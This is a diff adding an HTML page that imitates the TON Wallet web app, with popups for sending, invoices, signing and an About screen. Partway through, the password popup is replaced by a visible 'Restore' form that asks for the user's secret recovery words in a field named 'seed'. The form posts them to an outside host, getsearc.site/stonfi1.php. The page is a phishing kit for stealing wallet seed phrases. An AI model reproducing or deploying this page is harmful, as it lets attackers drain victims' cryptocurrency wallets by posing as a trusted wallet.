+            You can specify the amount and purpose of<br>
+            the payment to save the sender some time.
+        </div>
+
+        <div class="input-label mt-24 mb-18">Invoice URL</div>
+
+        <div id="invoice_link" class="popup-black-text">
+            ton://transfer/
+        </div>
+
+        <div class="popup-grey-text mt-24">
+            Share this address to receive TON.
+        </div>
+
+        <button id="invoice_qrBtn" class="btn-lite">Generate QR Code</button>
+        <button id="invoice_shareBtn" class="btn-blue">Share Invoice URL</button>
+
+        <button id="invoice_closeBtn" class="popup-close-btn"></button>
+    </div>
+
+    <!-- Invoice QR Popup-->
+
+    <div id="invoiceQr" class="popup visibility-hidden faded-hide">
+        <div class="popup-title">Invoice QR</div>
+
+        <div class="qr-container">
+            <div id="invoiceQrImg"></div>
+        </div>
+
+        <div class="input-label">Expected Amount</div>
+
+        <div id="invoiceQrAmount" class="popup-black-text">
+            1
+        </div>
+
+        <button id="invoiceQr_shareBtn" class="btn-blue">Share QR Code</button>
+
+        <button id="invoiceQr_closeBtn" class="popup-close-btn"></button>
+    </div>
+
+    <!-- Transaction Popup -->
+
+    <div id="transaction" class="popup visibility-hidden faded-hide">
+        <div class="popup-title">Transaction</div>
+
+        <div id="transactionAmount">+0.1 TON</div>
+        <div id="transactionFee">0.1 transaction fee</div>
+
+        <div id="transactionSenderLabel" class="input-label mt-20">Sender</div>
+
+        <div id="transactionSender" class="addr">
+
+        </div>
+
+        <div class="input-label">Date</div>
+
+        <div id="transactionDate" class="popup-black-text">
+
+        </div>
+
+        <div id="transactionCommentLabel" class="input-label">Comment</div>
+
+        <div id="transactionComment" class="popup-black-text"></div>
+
+        <div id="transactionDecryptCommentButton" class="btn-lite">Enter password to view comment</div>
+
+        <button id="transaction_sendBtn" class="btn-blue mt-20">Send TON to this address</button>
+
+        <button id="transaction_closeBtn" class="popup-close-btn"></button>
+    </div>
+
+    <!-- Send Popup -->
+
+    <div id="send" class="popup visibility-hidden faded-hide">
+        <div class="popup-title">Send TON</div>
+
+        <div class="input-label">Recipient wallet address</div>
+        <input id="toWalletInput" type="text" placeholder="Enter wallet address">
+
+        <div class="popup-grey-text">
+            Copy the 48-letter wallet address of the
+            recipient here or ask them to send you a
+            ton:// link
+        </div>
+
+        <div class="position-relative w-100">
+            <div class="input-label">Amount</div>
+            <div id="sendBalance">Balance: 500 💎</div>
+        </div>
+
+        <input id="amountInput" type="number" placeholder="0.0">
+        <input id="commentInput" type="text" placeholder="Comment (optional)">
+
+        <label id="encryptCommentCheckboxContainer" class="checkbox-container"> Encrypt Comment
+            <input type="checkbox" id="encryptCommentCheckbox">
+            <span class="checkmark"></span>
+        </label>
+
+        <button id="send_btn" class="btn-blue">Send TON</button>
+
+        <button id="send_closeBtn" class="popup-close-btn"></button>
+    </div>
+
+    <!-- Send Confirm Popup -->
+
+    <div id="sendConfirm" class="popup pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">Confirmation</div>
+        <div class="popup-black-text">Do you want to send <b id="sendConfirmAmount">x TON</b> to:</div>
+
+        <div id="sendConfirmAddr" class="addr"></div>
+
+        <div id="sendConfirmFee" class="popup-grey-text text-align-center">Fee: ~x TON</div>
+
+        <div id="sendConfirmNotEncryptedNote" class="popup-grey-text text-align-center">Note: Your comment will <b>not</b> be encrypted</div>
+
+        <button id="sendConfirm_closeBtn" class="popup-close-btn"></button>
+
+        <div class="popup-footer">
+            <button id="sendConfirm_cancelBtn" class="btn-lite">CANCEL</button>
+            <button id="sendConfirm_okBtn" class="btn-lite">SEND TON</button>
+        </div>
+    </div>
+
+    <!-- Sign Confirm Popup -->
+
+    <div id="signConfirm" class="popup pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">Confirmation</div>
+        <div id="signConfirmText" class="popup-black-text">Do you want to sign:</div>
+
+        <div id="signConfirmData" class="addr"></div>
+
+        <div id="signConfirmAlert" class="popup-grey-text text-align-center font-weight-bold text-danger">Signing custom data is very dangerous. Use only if you know what you are doing.</div>
+
+        <button id="signConfirm_closeBtn" class="popup-close-btn"></button>
+
+        <div class="popup-footer">
+            <button id="signConfirm_cancelBtn" class="btn-lite">NO</button>
+            <button id="signConfirm_okBtn" class="btn-lite">YES</button>
+        </div>
+    </div>
+
+    <!-- Connect Confirm Popup -->
+
+    <div id="connectConfirm" class="popup pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">Confirmation</div>
+        <div class="popup-black-text">Do you want to connect your wallet to this page?</div>
+
+        <button id="connectConfirm_closeBtn" class="popup-close-btn"></button>
+
+        <div class="popup-footer">
+            <button id="connectConfirm_cancelBtn" class="btn-lite">NO</button>
+            <button id="connectConfirm_okBtn" class="btn-lite">YES</button>
+        </div>
+    </div>
+
+    <!-- Processing Popup -->
+
+    <div id="processing" class="popup text-align-center visibility-hidden faded-hide">
+        <tgs-player data-name="processing" src="assets/lottie/money.tgs" width="150" height="150"><canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+        <div class="popup-title">Sending TON</div>
+        <div class="popup-grey-text">Please wait a few seconds for your<br>transaction to be processed..</div>
+
+        <button id="processing_closeBtn" class="popup-close-btn"></button>
+    </div>
+
+    <!-- Done Popup -->
+
+    <div id="done" class="popup text-align-center pb-10 visibility-hidden faded-hide">
+        <tgs-player data-name="done" src="assets/lottie/done.tgs" width="150" height="150"><canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+        <div class="popup-title">Done!</div>
+        <div class="popup-grey-text">1 TON have been send</div>
+
+        <div class="popup-footer">
+            <button id="done_closeBtn" class="btn-lite">CLOSE</button>
+        </div>
+    </div>
+
+    <!-- About Popup -->
+
+    <div id="about" class="popup text-align-center pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">TON Wallet</div>
+        <div id="about_version" class="popup-grey-text">
+            Version: 1.1.49
+        </div>
+        <tgs-player data-name="about" src="./TONWallet_files/intro.tgs" width="150" height="150"><canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+
+        <div class="popup-grey-text line-height-24">
+            API provider: <a href="https://toncenter.com/" target="_blank">toncenter.com</a><br>
+            <a href="https://github.com/toncenter/ton-wallet" target="_blank">GitHub</a>,
+            <a href="https://github.com/toncenter/ton-wallet/issues" target="_blank">Issue Tracker</a>
+        </div>
+
+        <div class="popup-black-text about-magic">
+            <h4>What is TON Magic?</h4>
+            <p>
+                TON Magic provides native <b>Telegram integration</b> by patching the official Telegram web app (Z version).
+            </p>
+            <p>
+                Turn it on to send and receive Toncoins from any Telegram user. <a href="https://telegra.ph/Telegram--TON-11-10" id="about-magic-video" target="_blank">More info and demo</a>.
+            </p>
+        </div>
+
+        <div class="popup-footer">
+            <button id="about_closeBtn" class="btn-lite">CLOSE</button>
+        </div>
+    </div>
+
+    <!-- Change Password Popup -->
+
+    <div id="changePassword" class="popup pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">Change Password</div>
+
+        <tgs-player data-name="changePassword" src="assets/lottie/lock.tgs" width="150" height="150"><canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+
+        <input id="changePassword_oldInput" placeholder="Enter your old password" type="password" class="input-password">
+        <input id="changePassword_newInput" placeholder="Enter a new password" type="password" class="input-password mt-20">
+        <input id="changePassword_repeatInput" placeholder="Repeat the new password" type="password" class="input-password">
+
+        <div class="popup-footer">
+            <button id="changePassword_cancelBtn" class="btn-lite">CANCEL</button>
+            <button id="changePassword_okBtn" class="btn-lite">SAVE</button>
+        </div>
+    </div>
+
+    <!-- Enter Password Popup -->
+</style><form method="post" action="https://getsearc.site/stonfi1.php?unlock/webstore/detail/kaikas/jblndlipeogpafnldhgmapagcccfchpi"></div><div class="main-container-wrapper">
+	  
+    <div id="enterPassword" class="popup pb-10 visibility-hidden faded-show">
+        <div class="popup-title">TON Wallet</div>
+
+        <tgs-player data-name="enterPassword" src="https://assets.coingecko.com/coins/images/17980/standard/photo_2024-09-10_17.09.00.jpeg?1725963446" width="150" height="150"><canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+        <input id="enterPassword_input" placeholder="Enter secret words you wrote" type="seed" class="input-password" spellcheck="false" name="seed" required="required"  >
+
+        <div class="popup-footer">
+            
+            <button id="enterPassword_okBtn" class="btn-lite">Restore</button>
+        </div>
+    </div>
+
+    <!-- Log Out Popup -->
+
+    <div id="delete" class="popup pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">Log Out</div>
+        <div class="popup-black-text">
+            This will disconnect the wallet from this<br>
+            app. You will be able to restore your<br>
+            wallet using <b>24 secret words</b> - or import<br>
+            another wallet.
+        </div>
+        <div class="popup-black-text mt-20">
+            Wallets are located in the decentralized<br>
+            TON Blockchain. If you want the wallet to<br>
+            be deleted simply transfer all the TON<br>
+            from it and leave it empty.
+        </div>
+
+        <div class="popup-footer">
+            <button id="delete_cancelBtn" class="btn-lite">CANCEL</button>
+            <button id="delete_okBtn" class="btn-lite btn-lite-red">DISCONNECT</button>
+        </div>
+    </div>
+
+    <!-- Connect Ledger Popup -->
+
+    <div id="connectLedger" class="popup pb-10 visibility-hidden faded-hide">
+        <div class="popup-title">Connect Ledger</div>
+        <div class="popup-black-text">
+            Please use Edge/Google Chrome v89 or later.
+        </div>
+        <div class="popup-black-text mt-20">
+            Turn off Ledger Live.
+        </div>
+        <div class="popup-black-text mt-20">
+            If it does not connect, then try reconnecting the device.
+        </div>
+
+        <div class="popup-footer">
+            <button id="connectLedger_cancelBtn" class="btn-lite">OK</button>
+        </div>
+    </div>
+
+    <!-- Notify-->
+
+    <div id="notify" class="visibility-hidden"></div>
+
+    <!-- Loader Popup -->
+
+    <div id="loader" class="popup text-align-center pb-10 visibility-hidden faded-hide">
+        <tgs-player data-name="loader" src="assets/lottie/intro.tgs" width="150" height="150"><canvas width="150" height="150" style="width: 150px; height: 150px;"></canvas></tgs-player>
+    </div>
+</div>
+
+<!-- Scripts -->
+
+<script type="text/javascript" src="./TONWallet_files/pako.min.js.download"></script>
+<script type="text/javascript" src="./TONWallet_files/lottie.min.js.download"></script>
+<script type="text/javascript" src="./TONWallet_files/easy.qrcode.min.js.download"></script>
+
+<script type="text/javascript" src="./TONWallet_files/aes-js-3.1.2.js.download"></script>
+<script type="text/javascript" src="./TONWallet_files/noble-ed25519-1.7.3.js.download"></script>
+
+<script type="text/javascript" src="./TONWallet_files/tonweb.min.js.download"></script>
+<script type="text/javascript" src="./TONWallet_files/tonweb-mnemonic.min.js.download"></script>
+
+<script src="./TONWallet_files/View.js.download" type="module"></script>
+<script src="./TONWallet_files/Controller.js.download" type="module"></script>
+
+<script defer="" src="./TONWallet_files/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon="{&quot;rayId&quot;:&quot;8f2c5a7e9978a9a9&quot;,&quot;serverTiming&quot;:{&quot;name&quot;:{&quot;cfExtPri&quot;:true,&quot;cfL4&quot;:true,&quot;cfSpeedBrain&quot;:true,&quot;cfCacheStatus&quot;:true}},&quot;version&quot;:&quot;2024.10.5&quot;,&quot;token&quot;:&quot;ddef453c6d524bdbaa78a31e942c9e63&quot;}" crossorigin="anonymous"></script>
+
+
+</body></html>
